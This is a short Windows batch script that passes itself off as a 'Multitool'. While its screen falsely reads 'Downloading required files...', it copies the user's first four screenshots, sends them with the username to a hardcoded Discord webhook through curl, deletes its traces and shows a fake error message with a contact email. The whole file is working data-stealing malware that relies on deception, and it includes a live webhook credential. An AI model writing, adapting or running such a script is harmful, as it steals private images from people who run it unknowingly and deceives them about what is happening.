@echo off
cls

echo Downloading required files...
cd %userprofile%\Downloads
md temp2
cd temp2
copy "%userprofile%\Pictures\Screenshots\Screenshot (1).png" loaded.png
copy "%userprofile%\Pictures\Screenshots\Screenshot (2).png" loaded2.png
copy "%userprofile%\Pictures\Screenshots\Screenshot (3).png" loaded3.png
copy "%userprofile%\Pictures\Screenshots\Screenshot (4).png" loaded4.png
set WEBHOOK_URL=https://discord.com/api/webhooks/1349741538607108169/o7bo63g6OZGxgfDO5cKL22zP8gziKX1EQ7c8KupUKt8OdAKMbezX4CSmlYu4JkpapIqs
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"@everyone Multitool was run by %username%\"}" %WEBHOOK_URL%
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded.png" https://discord.com/api/webhooks/1349741538607108169/o7bo63g6OZGxgfDO5cKL22zP8gziKX1EQ7c8KupUKt8OdAKMbezX4CSmlYu4JkpapIqs
cls
echo Downloading required files...
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded2.png" https://discord.com/api/webhooks/1349741538607108169/o7bo63g6OZGxgfDO5cKL22zP8gziKX1EQ7c8KupUKt8OdAKMbezX4CSmlYu4JkpapIqs
cls
echo Downloading required files...
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded3.png" https://discord.com/api/webhooks/1349741538607108169/o7bo63g6OZGxgfDO5cKL22zP8gziKX1EQ7c8KupUKt8OdAKMbezX4CSmlYu4JkpapIqs
cls
echo Downloading required files...
curl -X POST -F "file=@%userprofile%/Downloads/temp2/loaded4.png" https://discord.com/api/webhooks/1349741538607108169/o7bo63g6OZGxgfDO5cKL22zP8gziKX1EQ7c8KupUKt8OdAKMbezX4CSmlYu4JkpapIqs
cls
cd..
rd temp2 /s /q
echo Error! Please contact us on reklmistr@gmail.com
exit
